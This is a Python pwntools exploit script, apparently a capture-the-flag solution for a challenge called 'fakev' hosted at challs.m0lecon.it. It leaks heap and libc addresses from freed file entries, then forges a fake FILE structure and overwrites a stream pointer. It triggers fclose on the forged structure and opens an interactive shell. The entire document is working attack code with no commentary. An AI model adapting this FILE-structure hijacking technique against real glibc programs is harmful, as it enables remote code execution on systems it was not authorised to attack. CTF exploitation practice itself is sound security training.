#!/usr/bin/python

from pwn import *
from time import time
import sys
from file_exploit import file_exploit_64

def open_file(name):
    #s.recvuntil('Choice: ')
    s.sendline('1' + '\x00'*253)
    #s.recvuntil('Index: ')
    s.sendline(str(name) + '\x00'*253)

def read_file(index):
    s.recvuntil('Choice: ')
    s.sendline('2' + '\x00'*253)
    s.recvuntil('Index: ')
    s.sendline(str(index) + '\x00'*253)
    return s.recv(0xf0)

def close_file():
    #s.recvuntil('Choice: ')
    s.sendline('4' + '\x00'*253)

#context.log_level = 'debug'
config = '''
b *0x400ec6
b *0x40123e
'''
#s = process('./fakev')
#gdb.attach(s, config)
s = remote('challs.m0lecon.it', 9013)

#Start
t1 = time()

#Stage 1: Leak heap and libc addresses
for i in range(1, 9):
    open_file(i)
for i in range(8):
    close_file()
for i in range(16):
    s.recvuntil('Choice: ')
leak            = read_file(1)
heap            = u64(leak[:8]) - (0xe89250 - 0xe89000)
main_arena      = u64(leak[8:16]) - 96
libc            = main_arena - 0x3ebc40
log.success('leak1: ' + hex(heap + (0xe89250 - 0xe89000)))
log.success('leak2: ' + hex(libc + 96 + 0x3ebc40))
log.success('heap: ' + hex(heap))
log.success('libc: ' + hex(libc))

#Stage 2: Go to take the last file stream pointer's storage on the stack
for i in range(1, 10):
    open_file(i)

#Create fake file structure while server is sending traffic.
fake_file_addr  = 0x602108
libc_path       = '/lib/x86_64-linux-gnu/libc.so.6'
libc_base       = libc
file_struct     = file_exploit_64(fake_file_addr, libc_path, libc_base)
log.success('len(file_struct): ' + str(len(file_struct)))

for i in range(9):
    s.recvuntil('Choice: ')

#Stage 3: Attack, do fclose(fake_file_addr)
s.recvuntil('Choice: ')
payload  = '4' + '\x00'*7
payload += file_struct
payload  = payload[:254]
#Modify the file stream pointer of the 9th file
payload  = payload[:0xa8] + p64(fake_file_addr) + payload[0xa8+8:]
s.sendline(payload)

#End
t2 = time()
log.success('Interval: ' + str(t2-t1)[:4])
s.interactive()

